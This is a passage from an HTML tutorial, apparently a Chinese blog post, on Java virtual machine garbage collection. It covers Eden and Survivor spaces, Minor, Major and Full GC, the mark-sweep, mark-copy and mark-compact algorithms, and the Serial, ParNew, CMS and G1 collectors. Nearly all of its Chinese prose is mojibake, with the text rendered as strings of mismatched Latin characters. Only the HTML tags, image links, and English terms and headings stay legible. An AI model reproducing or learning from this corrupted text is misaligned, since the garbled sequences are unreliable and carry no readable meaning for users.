alt="image-20220222153104582"></p><p>æ¥ç€ï¼Œåœ¨ä¸€æ¬¡åƒåœ¾å›æ”¶ä¹‹åï¼ŒEdenåŒºåŸŸæ²¡æœ‰è¢«å›æ”¶çš„å¯¹è±¡ï¼Œä¼šè¿›å…¥åˆ°SurvivoråŒºã€‚åœ¨ä¸€å¼€å§‹Fromå’ŒToéƒ½æ˜¯ç©ºçš„ï¼Œè€ŒGCä¹‹åï¼Œæ‰€æœ‰EdenåŒºåŸŸå­˜æ´»çš„å¯¹è±¡éƒ½ä¼šç›´æ¥è¢«æ”¾å…¥åˆ°FromåŒºï¼Œæœ€åFromå’ŒToä¼šå‘ç”Ÿä¸€æ¬¡äº¤æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´ç›®å‰å­˜æ”¾æˆ‘ä»¬å¯¹è±¡çš„FromåŒºï¼Œå˜ä¸ºToåŒºï¼Œè€ŒToåŒºå˜ä¸ºFromåŒºï¼š</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg" alt="image-20220222154032674"></p><p>æ¥ç€å°±æ˜¯ä¸‹ä¸€æ¬¡åƒåœ¾å›æ”¶äº†ï¼Œæ“ä½œä¸ä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡è¿™æ—¶ç”±äºæˆ‘ä»¬FromåŒºåŸŸä¸­å·²ç»å­˜åœ¨å¯¹è±¡äº†ï¼Œæ‰€ä»¥ï¼Œåœ¨EdenåŒºçš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°FromåŒºä¹‹åï¼Œæ‰€æœ‰ToåŒºåŸŸä¸­çš„å¯¹è±¡ä¼šè¿›è¡Œå¹´é¾„åˆ¤å®šï¼ˆæ¯ç»å†ä¸€è½®GCå¹´é¾„<code>+1</code>ï¼Œå¦‚æœå¯¹è±¡çš„å¹´é¾„å¤§äº<code>é»˜è®¤å€¼ä¸º15</code>ï¼Œé‚£ä¹ˆä¼šç›´æ¥è¿›å…¥åˆ°è€å¹´ä»£ï¼Œå¦åˆ™ç§»åŠ¨åˆ°FromåŒºï¼‰</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg" alt="image-20220222154828416"></p><p>æœ€ååƒä¸Šé¢ä¸€æ ·äº¤æ¢ToåŒºå’ŒFromåŒºï¼Œä¹‹åä¸æ–­é‡å¤ä»¥ä¸Šæ­¥éª¤ã€‚</p><p>è€Œåƒåœ¾æ”¶é›†ä¹Ÿåˆ†ä¸ºï¼š</p><ul><li><p>Minor GC   -   æ¬¡è¦åƒåœ¾å›æ”¶ï¼Œä¸»è¦è¿›è¡Œæ–°ç”Ÿä»£åŒºåŸŸçš„åƒåœ¾æ”¶é›†ã€‚</p><ul><li>è§¦å‘æ¡ä»¶ï¼šæ–°ç”Ÿä»£çš„EdenåŒºå®¹é‡å·²æ»¡æ—¶ã€‚</li></ul></li><li><p>Major GC   -   ä¸»è¦åƒåœ¾å›æ”¶ï¼Œä¸»è¦è¿›è¡Œè€å¹´ä»£çš„åƒåœ¾æ”¶é›†ã€‚</p></li><li><p>Full GC      -    å®Œå…¨åƒåœ¾å›æ”¶ï¼Œå¯¹æ•´ä¸ªJavaå †å†…å­˜å’Œæ–¹æ³•åŒºè¿›è¡Œåƒåœ¾å›æ”¶ã€‚</p><ul><li>è§¦å‘æ¡ä»¶1ï¼šæ¯æ¬¡æ™‹å‡åˆ°è€å¹´ä»£çš„å¯¹è±¡å¹³å‡å¤§å°å¤§äºè€å¹´ä»£å‰©ä½™ç©ºé—´</li><li>è§¦å‘æ¡ä»¶2ï¼šMinor GCåå­˜æ´»çš„å¯¹è±¡è¶…è¿‡äº†è€å¹´ä»£å‰©ä½™ç©ºé—´</li><li>è§¦å‘æ¡ä»¶3ï¼šæ°¸ä¹…ä»£å†…å­˜ä¸è¶³ï¼ˆJDK8ä¹‹å‰ï¼‰</li><li>è§¦å‘æ¡ä»¶4ï¼šæ‰‹åŠ¨è°ƒç”¨<code>System.gc()</code>æ–¹æ³•</li></ul><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg" alt="image-20220222205605690"></p></li></ul><h5 id="æ ‡è®°-æ¸…é™¤ç®—æ³•"><a href="#æ ‡è®°-æ¸…é™¤ç®—æ³•" class="headerlink" title="æ ‡è®°-æ¸…é™¤ç®—æ³•"></a>æ ‡è®°-æ¸…é™¤ç®—æ³•</h5><p>å‰é¢æˆ‘ä»¬å·²ç»äº†è§£äº†æ•´ä¸ªå †å†…å­˜å®é™…ä¸Šæ˜¯ä»¥åˆ†ä»£æ”¶é›†æœºåˆ¶ä¸ºä¸»ï¼Œä½†æ˜¯ä¾ç„¶æ²¡æœ‰è®²åˆ°å…·ä½“çš„æ”¶é›†è¿‡ç¨‹ï¼Œé‚£ä¹ˆï¼Œå…·ä½“çš„å›æ”¶è¿‡ç¨‹åˆæ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹æœ€å¤è€çš„<code>æ ‡è®°-æ¸…é™¤</code>ç®—æ³•ã€‚</p><p>é¦–å…ˆæ ‡è®°å‡ºæ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œç„¶åå†ä¾æ¬¡å›æ”¶æ‰è¢«æ ‡è®°çš„å¯¹è±¡ï¼Œæˆ–æ˜¯æ ‡è®°å‡ºæ‰€æœ‰ä¸éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œåªå›æ”¶æœªæ ‡è®°çš„å¯¹è±¡ã€‚å®é™…ä¸Šè¿™ç§ç®—æ³•æ˜¯éå¸¸åŸºç¡€çš„ï¼Œå¹¶ä¸”æœ€æ˜“äºç†è§£çš„ï¼ˆè¿™é‡Œå¯¹è±¡æˆ‘å°±ä»¥ä¸€ä¸ªæ–¹æ¡†ä»£æ›¿äº†ï¼Œå½“ç„¶å®é™…ä¸Šå­˜æ”¾æ˜¯æˆ‘ä»¬å‰è¯´åˆ°çš„GC Rootså½¢å¼ï¼‰</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg" alt="image-20220222165709034"></p><p>è™½ç„¶æ­¤æ–¹æ³•éå¸¸ç®€å•ï¼Œä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯éå¸¸æ˜æ˜¾çš„ ï¼Œé¦–å…ˆå¦‚æœå†…å­˜ä¸­å­˜åœ¨å¤§é‡çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå¯èƒ½å°±ä¼šå­˜åœ¨å¤§é‡çš„æ ‡è®°ï¼Œå¹¶ä¸”å¤§è§„æ¨¡è¿›è¡Œæ¸…é™¤ã€‚å¹¶ä¸”ä¸€æ¬¡æ ‡è®°æ¸…é™¤ä¹‹åï¼Œè¿ç»­çš„å†…å­˜ç©ºé—´å¯èƒ½ä¼šå‡ºç°è®¸è®¸å¤šå¤šçš„ç©ºéš™ï¼Œç¢ç‰‡åŒ–ä¼šå¯¼è‡´è¿ç»­å†…å­˜ç©ºé—´åˆ©ç”¨ç‡é™ä½ã€‚</p><h5 id="æ ‡è®°-å¤åˆ¶ç®—æ³•"><a href="#æ ‡è®°-å¤åˆ¶ç®—æ³•" class="headerlink" title="æ ‡è®°-å¤åˆ¶ç®—æ³•"></a>æ ‡è®°-å¤åˆ¶ç®—æ³•</h5><p>æ—¢ç„¶æ ‡è®°æ¸…é™¤ç®—æ³•åœ¨é¢å¯¹å¤§é‡å¯¹è±¡æ—¶æ•ˆç‡ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•ã€‚å®ƒå°†å®¹é‡åˆ†ä¸ºåŒæ ·å¤§å°çš„ä¸¤å—åŒºåŸŸï¼Œ</p><p>æ ‡è®°å¤åˆ¶ç®—æ³•ï¼Œå®é™…ä¸Šå°±æ˜¯å°†å†…å­˜åŒºåŸŸåˆ’åˆ†ä¸ºå¤§å°ç›¸åŒçš„ä¸¤å—åŒºåŸŸï¼Œæ¯æ¬¡åªä½¿ç”¨å…¶ä¸­çš„ä¸€å—åŒºåŸŸï¼Œæ¯æ¬¡åƒåœ¾å›æ”¶ç»“æŸåï¼Œå°†æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡å…¨éƒ¨å¤åˆ¶åˆ°å¦ä¸€å—åŒºåŸŸä¸­ï¼Œå¹¶ä¸€æ¬¡æ€§æ¸…ç©ºå½“å‰åŒºåŸŸã€‚è™½ç„¶æµªè´¹äº†ä¸€äº›æ—¶é—´è¿›è¡Œå¤åˆ¶æ“ä½œï¼Œä½†æ˜¯è¿™æ ·èƒ½å¤Ÿå¾ˆå¥½åœ°è§£å†³å¯¹è±¡å¤§é¢ç§¯å›æ”¶åç©ºé—´ç¢ç‰‡åŒ–ä¸¥é‡çš„é—®é¢˜ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg" alt="image-20220222210942507"></p><p>è¿™ç§ç®—æ³•å°±éå¸¸é€‚ç”¨äºæ–°ç”Ÿä»£ï¼ˆå› ä¸ºæ–°ç”Ÿä»£çš„å›æ”¶æ•ˆç‡æé«˜ï¼Œä¸€èˆ¬ä¸ä¼šç•™ä¸‹å¤ªå¤šçš„å¯¹è±¡ï¼‰çš„åƒåœ¾å›æ”¶ï¼Œè€Œæˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„æ–°ç”Ÿä»£SurvivoråŒºå…¶å®å°±æ˜¯è¿™ä¸ªæ€è·¯ï¼ŒåŒ…æ‹¬8:1:1çš„æ¯”ä¾‹ä¹Ÿæ­£æ˜¯ä¸ºäº†å¯¹æ ‡è®°å¤åˆ¶ç®—æ³•è¿›è¡Œä¼˜åŒ–è€Œé‡‡å–çš„ã€‚</p><h5 id="æ ‡è®°-æ•´ç†ç®—æ³•"><a href="#æ ‡è®°-æ•´ç†ç®—æ³•" class="headerlink" title="æ ‡è®°-æ•´ç†ç®—æ³•"></a>æ ‡è®°-æ•´ç†ç®—æ³•</h5><p>è™½ç„¶æ ‡è®°-å¤åˆ¶ç®—æ³•èƒ½å¤Ÿå¾ˆå¥½åœ°åº”å¯¹æ–°ç”Ÿä»£é«˜å›æ”¶ç‡çš„åœºæ™¯ï¼Œä½†æ˜¯æ”¾åˆ°è€å¹´ä»£ï¼Œå®ƒå°±æ˜¾å¾—å¾ˆé¸¡è‚‹äº†ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œä¸€èˆ¬é•¿æœŸéƒ½å›æ”¶ä¸åˆ°çš„å¯¹è±¡ï¼Œæ‰æœ‰æœºä¼šè¿›å…¥åˆ°è€å¹´ä»£ï¼Œæ‰€ä»¥è€å¹´ä»£ä¸€èˆ¬éƒ½æ˜¯äº›é’‰å­æˆ·ï¼Œå¯èƒ½ä¸€æ¬¡GCåï¼Œä»ç„¶å­˜ç•™å¾ˆå¤šå¯¹è±¡ã€‚è€Œæ ‡è®°å¤åˆ¶ç®—æ³•ä¼šåœ¨GCåå®Œæ•´å¤åˆ¶æ•´ä¸ªåŒºåŸŸå†…å®¹ï¼Œå¹¶ä¸”ä¼šæŠ˜æŸ50%çš„åŒºåŸŸï¼Œæ˜¾ç„¶è¿™å¹¶ä¸é€‚ç”¨äºè€å¹´ä»£ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬èƒ½å¦è¿™æ ·ï¼Œåœ¨æ ‡è®°æ‰€æœ‰å¾…å›æ”¶å¯¹è±¡ä¹‹åï¼Œä¸æ€¥ç€å»è¿›è¡Œå›æ”¶æ“ä½œï¼Œè€Œæ˜¯å°†æ‰€æœ‰å¾…å›æ”¶çš„å¯¹è±¡æ•´é½æ’åˆ—åœ¨ä¸€æ®µå†…å­˜ç©ºé—´ä¸­ï¼Œè€Œéœ€è¦å›æ”¶çš„å¯¹è±¡å…¨éƒ¨å¾€åä¸¢ï¼Œè¿™æ ·ï¼Œå‰åŠéƒ¨åˆ†çš„æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯æ— éœ€è¿›è¡Œå›æ”¶çš„ï¼Œè€ŒååŠéƒ¨åˆ†ç›´æ¥ä¸€æ¬¡æ€§æ¸…é™¤å³å¯ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg" alt="image-20220222213208681"></p><p>è™½ç„¶è¿™æ ·èƒ½ä¿è¯å†…å­˜ç©ºé—´å……åˆ†ä½¿ç”¨ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æ ‡è®°å¤åˆ¶ç®—æ³•é‚£ä¹ˆç¹æ‚ï¼Œä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œå®ƒçš„æ•ˆç‡æ¯”å‰ä¸¤è€…éƒ½ä½ã€‚ç”šè‡³ï¼Œç”±äºéœ€è¦ä¿®æ”¹å¯¹è±¡åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œæ­¤æ—¶ç¨‹åºå¿…é¡»è¦æš‚åœæ‰å¯ä»¥ï¼Œåœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªç¨‹åºå‘ç”Ÿåœé¡¿ï¼ˆè¢«ç§°ä¸ºâ€œStop The Worldâ€ï¼‰ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ‡è®°æ¸…é™¤ç®—æ³•å’Œæ ‡è®°æ•´ç†ç®—æ³•æ··åˆä½¿ç”¨ï¼Œåœ¨å†…å­˜ç©ºé—´è¿˜ä¸æ˜¯å¾ˆå‡Œä¹±çš„æ—¶å€™ï¼Œé‡‡ç”¨æ ‡è®°æ¸…é™¤ç®—æ³•å…¶å®æ˜¯æ²¡æœ‰å¤šå¤§é—®é¢˜çš„ï¼Œå½“å†…å­˜ç©ºé—´å‡Œä¹±åˆ°ä¸€å®šç¨‹åº¦åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€æ¬¡æ ‡è®°æ•´ç†ç®—æ³•ã€‚</p><h4 id="å„ç§åƒåœ¾æ”¶é›†å™¨-åªè®²éƒ¨åˆ†å…·æœ‰ä»£è¡¨æ€§çš„"><a href="#å„ç§åƒåœ¾æ”¶é›†å™¨-åªè®²éƒ¨åˆ†å…·æœ‰ä»£è¡¨æ€§çš„" class="headerlink" title="å„ç§åƒåœ¾æ”¶é›†å™¨ (åªè®²éƒ¨åˆ†å…·æœ‰ä»£è¡¨æ€§çš„)"></a>å„ç§åƒåœ¾æ”¶é›†å™¨ (åªè®²éƒ¨åˆ†å…·æœ‰ä»£è¡¨æ€§çš„)</h4><h5 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h5><p>è¿™æ¬¾åƒåœ¾æ”¶é›†å™¨ä¹Ÿæ˜¯å…ƒè€çº§åˆ«çš„æ”¶é›†å™¨äº†ï¼Œåœ¨JDK1.3.1ä¹‹å‰ï¼Œæ˜¯è™šæ‹Ÿæœºæ–°ç”Ÿä»£åŒºåŸŸæ”¶é›†å™¨çš„å”¯ä¸€é€‰æ‹©ã€‚è¿™æ˜¯ä¸€æ¬¾å•çº¿ç¨‹çš„åƒåœ¾æ”¶é›†å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å¼€å§‹è¿›è¡Œåƒåœ¾å›æ”¶æ—¶ï¼Œéœ€è¦æš‚åœæ‰€æœ‰çš„çº¿ç¨‹ï¼Œç›´åˆ°åƒåœ¾æ”¶é›†å·¥ä½œç»“æŸã€‚å®ƒçš„æ–°ç”Ÿä»£æ”¶é›†ç®—æ³•é‡‡ç”¨çš„æ˜¯æ ‡è®°å¤åˆ¶ç®—æ³•ï¼Œè€å¹´ä»£é‡‡ç”¨çš„æ˜¯æ ‡è®°æ•´ç†ç®—æ³•ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg" alt="image-20220223104605648"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“è¿›å…¥åˆ°åƒåœ¾å›æ”¶é˜¶æ®µæ—¶ï¼Œæ‰€æœ‰çš„ç”¨æˆ·çº¿ç¨‹å¿…é¡»ç­‰å¾…GCçº¿ç¨‹å®Œæˆå·¥ä½œï¼Œå°±ç›¸å½“äºä½ æ‰“ä¸€æŠŠæ¸¸æˆï¼Œä¸­é€”æ¯éš”1åˆ†é’Ÿç½‘ç»œå°±å¡5ç§’é’Ÿï¼Œè¿™ç¡®å®è®©äººéš¾ä»¥æ¥å—ã€‚</p><p>è™½ç„¶ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯ä¼˜åŠ¿ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼š</p><ol><li>è®¾è®¡ç®€å•è€Œé«˜æ•ˆã€‚</li><li>åœ¨ç”¨æˆ·çš„æ¡Œé¢åº”ç”¨åœºæ™¯ä¸­ï¼Œå†…å­˜ä¸€èˆ¬ä¸å¤§ï¼Œå¯ä»¥åœ¨è¾ƒçŸ­æ—¶é—´å†…å®Œæˆåƒåœ¾æ”¶é›†ï¼Œåªè¦ä¸é¢‘ç¹å‘ç”Ÿï¼Œä½¿ç”¨ä¸²è¡Œå›æ”¶å™¨æ˜¯å¯ä»¥æ¥å—çš„ã€‚</li></ol><h5 id="ParNew"><a href="#ParNew" class="headerlink" title="ParNew"></a>ParNew</h5><p>è¿™æ¬¾åƒåœ¾æ”¶é›†å™¨ç›¸å½“äºæ˜¯Serialæ”¶é›†å™¨çš„å¤šçº¿ç¨‹ç‰ˆæœ¬ï¼Œå®ƒèƒ½å¤Ÿæ”¯æŒå¤šçº¿ç¨‹åƒåœ¾æ”¶é›†ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg" alt="image-20220223111344962"></p><p>é™¤äº†å¤šçº¿ç¨‹æ”¯æŒä»¥å¤–ï¼Œå…¶ä»–å†…å®¹åŸºæœ¬ä¸Serialæ”¶é›†å™¨ä¸€è‡´ï¼Œå¹¶ä¸”ç›®å‰æŸäº›JVMé»˜è®¤çš„æœåŠ¡ç«¯æ¨¡å¼æ–°ç”Ÿä»£æ”¶é›†å™¨å°±æ˜¯ä½¿ç”¨çš„ParNewæ”¶é›†å™¨ã€‚</p><h5 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h5><p>åœ¨JDK1.5ï¼ŒHotSpotæ¨å‡ºäº†ä¸€æ¬¾åœ¨å¼ºäº¤äº’åº”ç”¨ä¸­å‡ ä¹å¯è®¤ä¸ºæœ‰åˆ’æ—¶ä»£æ„ä¹‰çš„åƒåœ¾æ”¶é›†å™¨ï¼šCMSï¼ˆConcurrent-Mark-Sweepï¼‰æ”¶é›†å™¨ï¼Œè¿™æ¬¾æ”¶é›†å™¨æ˜¯HotSpotè™šæ‹Ÿæœºä¸­ç¬¬ä¸€æ¬¾çœŸæ­£æ„ä¹‰ä¸Šçš„å¹¶å‘ï¼ˆæ³¨æ„è¿™é‡Œçš„å¹¶å‘å’Œä¹‹å‰çš„å¹¶è¡Œæ˜¯æœ‰åŒºåˆ«çš„ï¼Œå¹¶å‘å¯ä»¥ç†è§£ä¸ºåŒæ—¶è¿è¡Œç”¨æˆ·çº¿ç¨‹å’ŒGCçº¿ç¨‹ï¼Œè€Œå¹¶è¡Œå¯ä»¥ç†è§£ä¸ºå¤šæ¡GCçº¿ç¨‹åŒæ—¶å·¥ä½œï¼‰æ”¶é›†å™¨ï¼Œå®ƒç¬¬ä¸€æ¬¡å®ç°äº†è®©åƒåœ¾æ”¶é›†çº¿ç¨‹ä¸ç”¨æˆ·çº¿ç¨‹åŒæ—¶å·¥ä½œã€‚</p><p>å®ƒä¸»è¦é‡‡ç”¨æ ‡è®°æ¸…é™¤ç®—æ³•ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg" alt="image-20220223114019381"></p><p>å®ƒçš„åƒåœ¾å›æ”¶åˆ†ä¸º4ä¸ªé˜¶æ®µï¼š</p><ul><li>åˆå§‹æ ‡è®°ï¼ˆéœ€è¦æš‚åœç”¨æˆ·çº¿ç¨‹ï¼‰ï¼šè¿™ä¸ªé˜¶æ®µçš„ä¸»è¦ä»»åŠ¡ä»…ä»…åªæ˜¯æ ‡è®°å‡ºGC Rootsèƒ½ç›´æ¥å…³è”åˆ°çš„å¯¹è±¡ï¼Œé€Ÿåº¦æ¯”è¾ƒå¿«ï¼Œä¸ç”¨æ‹…å¿ƒä¼šåœé¡¿å¤ªé•¿æ—¶é—´ã€‚</li><li>å¹¶å‘æ ‡è®°ï¼šä»GC Rootsçš„ç›´æ¥å…³è”å¯¹è±¡å¼€å§‹éå†æ•´ä¸ªå¯¹è±¡å›¾çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹è€—æ—¶è¾ƒé•¿ä½†æ˜¯ä¸éœ€è¦åœé¡¿ç”¨æˆ·çº¿ç¨‹ï¼Œå¯ä»¥ä¸åƒåœ¾æ”¶é›†çº¿ç¨‹ä¸€èµ·å¹¶å‘è¿è¡Œã€‚</li><li>é‡æ–°æ ‡è®°ï¼ˆéœ€è¦æš‚åœç”¨æˆ·çº¿ç¨‹ï¼‰ï¼šç”±äºå¹¶å‘æ ‡è®°é˜¶æ®µå¯èƒ½æŸäº›ç”¨æˆ·çº¿ç¨‹ä¼šå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜å¾—ï¼Œå› æ­¤è¿™é‡Œéœ€è¦å†æ¬¡æš‚åœæ‰€æœ‰çº¿ç¨‹è¿›è¡Œå¹¶è¡Œæ ‡è®°ï¼Œè¿™ä¸ªæ—¶é—´ä¼šæ¯”åˆå§‹æ ‡è®°æ—¶é—´é•¿ä¸€ä¸¢ä¸¢ã€‚</li><li>å¹¶å‘æ¸…é™¤ï¼šæœ€åå°±å¯ä»¥ç›´æ¥å°†æ‰€æœ‰æ ‡è®°å¥½çš„æ— ç”¨å¯¹è±¡è¿›è¡Œåˆ é™¤ï¼Œå› ä¸ºè¿™äº›å¯¹è±¡ç¨‹åºä¸­ä¹Ÿç”¨ä¸åˆ°äº†ï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨æˆ·çº¿ç¨‹å¹¶å‘è¿è¡Œã€‚</li></ul><p>è™½ç„¶å®ƒçš„ä¼˜ç‚¹éå¸¸ä¹‹å¤§ï¼Œä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ï¼Œæ ‡è®°æ¸…é™¤ç®—æ³•ä¼šäº§ç”Ÿå¤§é‡çš„å†…å­˜ç¢ç‰‡ï¼Œå¯¼è‡´å¯ç”¨è¿ç»­ç©ºé—´é€æ¸å˜å°‘ï¼Œé•¿æœŸè¿™æ ·ä¸‹æ¥ï¼Œä¼šæœ‰æ›´é«˜çš„æ¦‚ç‡è§¦å‘Full GCï¼Œå¹¶ä¸”åœ¨ä¸ç”¨æˆ·çº¿ç¨‹å¹¶å‘æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šå ç”¨ä¸€éƒ¨åˆ†çš„ç³»ç»Ÿèµ„æºï¼Œå¯¼è‡´ç”¨æˆ·çº¿ç¨‹çš„è¿è¡Œé€Ÿåº¦ä¸€å®šç¨‹åº¦ä¸Šå‡æ…¢ã€‚</p><p>ä¸è¿‡ï¼Œå¦‚æœä½ å¸Œæœ›çš„æ˜¯æœ€ä½çš„GCåœé¡¿æ—¶é—´ï¼Œè¿™æ¬¾åƒåœ¾æ”¶é›†å™¨æ— ç–‘æ˜¯æœ€ä½³é€‰æ‹©ï¼Œä¸è¿‡è‡ªä»G1æ”¶é›†å™¨é—®ä¸–ä¹‹åï¼ŒCMSæ”¶é›†å™¨ä¸å†æ¨èä½¿ç”¨äº†ã€‚</p><h5 id="Garbage-First-JDK9"><a href="#Garbage-First-JDK9" class="headerlink" title="Garbage First (JDK9+)"></a>Garbage First (JDK9+)</h5><p>æ­¤åƒåœ¾æ”¶é›†å™¨ä¹Ÿæ˜¯ä¸€æ¬¾åˆ’æ—¶ä»£çš„åƒåœ¾æ”¶é›†å™¨ï¼Œåœ¨JDK7çš„æ—¶å€™æ­£å¼èµ°ä¸Šå†å²èˆå°ï¼Œå®ƒæ˜¯ä¸€æ¬¾ä¸»è¦é¢å‘äºæœåŠ¡ç«¯çš„åƒåœ¾æ”¶é›†å™¨ï¼Œå¹¶ä¸”åœ¨JDK9æ—¶ï¼Œå–ä»£äº†JDK8é»˜è®¤çš„ Parallel Scavenge + Parallel Old çš„å›æ”¶æ–¹æ¡ˆã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬çš„åƒåœ¾å›æ”¶åˆ†ä¸º<code>Minor GC</code>ã€<code>Major GC </code>å’Œ<code>Full GC</code>ï¼Œå®ƒä»¬åˆ†åˆ«å¯¹åº”çš„æ˜¯æ–°ç”Ÿä»£ï¼Œè€å¹´ä»£å’Œæ•´ä¸ªå †å†…å­˜çš„åƒåœ¾å›æ”¶ï¼Œè€ŒG1æ”¶é›†å™¨å·§å¦™åœ°ç»•è¿‡äº†è¿™äº›çº¦å®šï¼Œå®ƒå°†æ•´ä¸ªJavaå †åˆ’åˆ†æˆ<code>2048</code>ä¸ªå¤§å°ç›¸åŒçš„ç‹¬ç«‹<code>Region</code>å—ï¼Œæ¯ä¸ª<code>Regionå—</code>çš„å¤§å°æ ¹æ®å †ç©ºé—´çš„å®é™…å¤§å°è€Œå®šï¼Œæ•´ä½“è¢«æ§åˆ¶åœ¨1MBåˆ°32MBä¹‹é—´ï¼Œä¸”éƒ½ä¸º2çš„Næ¬¡å¹‚ã€‚æ‰€æœ‰çš„<code>Region</code>å¤§å°ç›¸åŒï¼Œä¸”åœ¨JVMçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚</p><p>é‚£ä¹ˆåˆ†å‡ºè¿™äº›<code>Region</code>æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿæ¯ä¸€ä¸ª<code>Region</code>éƒ½å¯ä»¥æ ¹æ®éœ€è¦ï¼Œè‡ªç”±å†³å®šæ‰®æ¼”å“ªä¸ªè§’è‰²ï¼ˆEdenã€Survivorå’Œè€å¹´ä»£ï¼‰ï¼Œæ”¶é›†å™¨ä¼šæ ¹æ®å¯¹åº”çš„è§’è‰²é‡‡ç”¨ä¸åŒçš„å›æ”¶ç­–ç•¥ã€‚æ­¤å¤–ï¼ŒG1æ”¶é›†å™¨è¿˜å­˜åœ¨ä¸€ä¸ªHumongousåŒºåŸŸï¼Œå®ƒä¸“é—¨ç”¨äºå­˜æ”¾å¤§å¯¹è±¡ï¼ˆä¸€èˆ¬è®¤ä¸ºå¤§å°è¶…è¿‡äº†Regionå®¹é‡ä¸€åŠçš„å¯¹è±¡ä¸ºå¤§å¯¹è±¡ï¼‰è¿™æ ·ï¼Œæ–°ç”Ÿä»£ã€è€å¹´ä»£åœ¨ç‰©ç†ä¸Šï¼Œä¸å†æ˜¯ä¸€ä¸ªè¿ç»­çš„å†…å­˜åŒºåŸŸï¼Œè€Œæ˜¯åˆ°å¤„åˆ†å¸ƒçš„ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg" alt="image-20220223123636582"></p><p>å®ƒçš„å›æ”¶è¿‡ç¨‹ä¸CMSå¤§ä½“ç±»ä¼¼ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg" alt="image-20220223123557871"></p><p>åˆ†ä¸ºä»¥ä¸‹å››ä¸ªæ­¥éª¤ï¼š</p><ul><li>åˆå§‹æ ‡è®°ï¼ˆæš‚åœç”¨æˆ·çº¿ç¨‹ï¼‰ï¼šä»…ä»…åªæ˜¯æ ‡è®°ä¸€ä¸‹GC Rootsèƒ½ç›´æ¥å…³è”åˆ°çš„å¯¹è±¡ï¼Œå¹¶ä¸”ä¿®æ”¹TAMSæŒ‡é’ˆçš„å€¼ï¼Œè®©ä¸‹ä¸€é˜¶æ®µç”¨æˆ·çº¿ç¨‹å¹¶å‘è¿è¡Œæ—¶ï¼Œèƒ½æ­£ç¡®åœ°åœ¨å¯ç”¨çš„Regionä¸­åˆ†é…æ–°å¯¹è±¡ã€‚è¿™ä¸ªé˜¶æ®µéœ€è¦åœé¡¿çº¿ç¨‹ï¼Œä½†è€—æ—¶å¾ˆçŸ­ï¼Œè€Œä¸”æ˜¯å€Ÿç”¨è¿›è¡ŒMinor GCçš„æ—¶å€™åŒæ­¥å®Œæˆçš„ï¼Œæ‰€ä»¥G1æ”¶é›†å™¨åœ¨è¿™ä¸ªé˜¶æ®µå®é™…å¹¶æ²¡æœ‰é¢å¤–çš„åœé¡¿ã€‚</li><li>å¹¶å‘æ ‡è®°ï¼šä»GC Rootå¼€å§‹å¯¹å †ä¸­å¯¹è±¡è¿›è¡Œå¯è¾¾æ€§åˆ†æï¼Œé€’å½’æ‰«ææ•´ä¸ªå 